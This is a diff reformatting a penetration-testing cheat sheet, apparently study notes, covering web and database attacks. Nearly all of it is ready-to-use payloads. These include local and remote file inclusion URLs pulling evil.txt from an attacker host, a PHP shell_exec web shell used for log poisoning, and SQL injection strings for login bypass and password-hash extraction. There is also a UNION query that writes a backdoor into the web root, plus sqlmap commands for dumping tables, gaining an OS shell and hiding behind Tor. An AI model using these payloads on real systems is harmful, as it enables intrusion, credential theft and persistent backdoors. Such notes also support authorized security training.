@@ -1747,64 +1747,72 @@ Client, Web and Password Attacks
         GET
         /addguestbook.php?name=Haxor&comment=Merci!&LANG=../../../../../../../windows/system32/drivers/etc/hosts%00
 
-    -   Contaminating Log Files <?php echo
-        shell\_exec($\_GET\['cmd'\]);?>
+    -   Contaminating Log Files `<?php echo shell_exec($_GET['cmd']);?>`
 
-    -   For a Remote File Inclusion look for php code that is not
-        sanitized and passed to the PHP include function and the php.ini
+    -   For a Remote File Inclusion look for php code that is not  sanitized and passed to the PHP include function and the php.ini
         file must be configured to allow remote files
-        /etc/php5/cgi/php.ini - “allow\_url\_fopen” and
-        “allow\_url\_include both set to “on”  
-        include($\_REQUEST\["file"\].".php");
+        
+        */etc/php5/cgi/php.ini* - "allow_url_fopen" and "allow_url_include" both set to "on"  
+        
+        `include($_REQUEST["file"].".php");`
 
     -   Remote File Inclusion  
-        [http://$ip/addguestbook.php?name=a&comment=b&LANG=http://$localip/evil.txt](http://192.168.11.35/addguestbook.php?name=a&comment=b&LANG=http://192.168.10.5/evil.txt)  
-        <?php echo shell\_exec("ipconfig");?>
+    
+         `http://192.168.11.35/addguestbook.php?name=a&comment=b&LANG=http://192.168.10.5/evil.txt `
+        
+         `<?php echo shell\_exec("ipconfig");?>`
 
 -   <span id="_mgu7e3u7svak" class="anchor"><span id="_Toc480741820" class="anchor"></span></span>Database Vulnerabilities
     ----------------------------------------------------------------------------------------------------------------------
 
-    -   MySQL SQL
-
-    -   Grab password hashes from a web application mysql database
-        called “Users” - once you have the MySQL root username and
-        password  
-        mysql -u root -p -h $ip  
-        use "Users"  
-        show tables;  
-        select \* from users;
+    -   Grab password hashes from a web application mysql database called “Users” - once you have the MySQL root username and        password  
+    
+              mysql -u root -p -h $ip
+              use "Users"  
+              show tables;  
+              select \* from users;
 
     -   Authentication Bypass  
-        name='wronguser' or 1=1;\#  
-        name='wronguser' or 1=1 LIMIT 1;\#
+    
+              name='wronguser' or 1=1;  
+              name='wronguser' or 1=1 LIMIT 1;
 
     -   Enumerating the Database  
-        [http://$ip/comment.php?id=738](http://192.168.11.35/comment.php?id=738)’  
+    
+        `http://192.168.11.35/comment.php?id=738)'`  
+        
         Verbose error message?  
-        http://$ip/comment.php?id=738 order by 1  
-        http://$ip/comment.php?id=738 union all select 1,2,3,4,5,6  
+        
+        `http://$ip/comment.php?id=738 order by 1`
+        
+        `http://$ip/comment.php?id=738 union all select 1,2,3,4,5,6  `
+        
         Determine MySQL Version:  
-        http://$ip/comment.php?id=738 union all select
-        1,2,3,4,@@version,6  
-        current user being used for the database connection  
-        http://$ip/comment.php?id=738 union all select
-        1,2,3,4,user(),6  
-        we can enumerate database tables and column structures  
-        http://$ip/comment.php?id=738 union all select
-        1,2,3,4,table\_name,6 FROM information\_schema.tables  
-        target the users table in the database  
-        http://$ip/comment.php?id=738 union all select
-        1,2,3,4,column\_name,6 FROM information\_schema.columns where
-        table\_name='users'  
-        extract the name and password  
-        http://$ip/comment.php?id=738 union select
-        1,2,3,4,concat(name,0x3a, password),6 FROM users  
-        Create a backdoor  
-        http://$ip/comment.php?id=738 union all select 1,2,3,4,"<?php
-        echo shell\_exec($\_GET\['cmd'\]);?>",6 into OUTFILE
-        'c:/xampp/htdocs/backdoor.php'
+        
+        `http://$ip/comment.php?id=738 union all select 1,2,3,4,@@version,6  `
+        
+        Current user being used for the database connection:
+        
+        `http://$ip/comment.php?id=738 union all select 1,2,3,4,user(),6  `
+        
+        Enumerate database tables and column structures  
+        
+        `http://$ip/comment.php?id=738 union all select 1,2,3,4,table_name,6 FROM information_schema.tables  `
+        
+        Target the users table in the database  
+        
+        `http://$ip/comment.php?id=738 union all select 1,2,3,4,column_name,6 FROM information_schema.columns where        table_name='users'  `
+        
+        Extract the name and password  
+        
+        `http://$ip/comment.php?id=738 union select 1,2,3,4,concat(name,0x3a, password),6 FROM users ` 
+        
+        Create a backdoor
+        
+        `http://$ip/comment.php?id=738 union all select 1,2,3,4,"<?php echo shell_exec($_GET['cmd']);?>",6 into OUTFILE        'c:/xampp/htdocs/backdoor.php'`
+        
 
-    -   SQLMap Examples
+    -   **SQLMap Examples**
 
       - Crawl the links
       
@@ -1865,29 +1873,30 @@ Client, Web and Password Attacks
             
                `sqlmap --dbms=mysql -u "$URL" -D "$DATABASE" -T "$TABLE" --dump `
                    
-             - Specify parameter to exploit  
+            - Specify parameter to exploit  
              
                `sqlmap --dbms=mysql -u "http://www.example.com/param1=value1&param2=value2" --dbs -p param2 `
                     
-             - Specify parameter to exploit in 'nice' URIs (exploits param1)
+            - Specify parameter to exploit in 'nice' URIs (exploits param1)
              
                 `sqlmap --dbms=mysql -u "http://www.example.com/param1/value1*/param2/value2" --dbs `
                      
-              - Get OS shell  
+            - Get OS shell  
               
                  `sqlmap --dbms=mysql -u "$URL" --os-shell`
                        
-               - Get SQL shell  
+            - Get SQL shell  
                        
                  `sqlmap --dbms=mysql -u "$URL" --sql-shell`
                         
-                - SQL query  
+             - SQL query  
                 
-                  `sqlmap --dbms=mysql -u "$URL" -D "$DATABASE" --sql-query "SELECT * FROM $TABLE;"` 
+                `sqlmap --dbms=mysql -u "$URL" -D "$DATABASE" --sql-query "SELECT * FROM $TABLE;"` 
                          
-                 - Use Tor Socks5 proxy  
+             - Use Tor Socks5 proxy  
                  
-                  `sqlmap --tor --tor-type=SOCKS5 --check-tor --dbms=mysql -u "$URL" --dbs`
+                `sqlmap --tor --tor-type=SOCKS5 --check-tor --dbms=mysql -u "$URL" --dbs`
+                 
 
 -   Password Attacks
     --------------------------------------------------------------------------------------------------------------
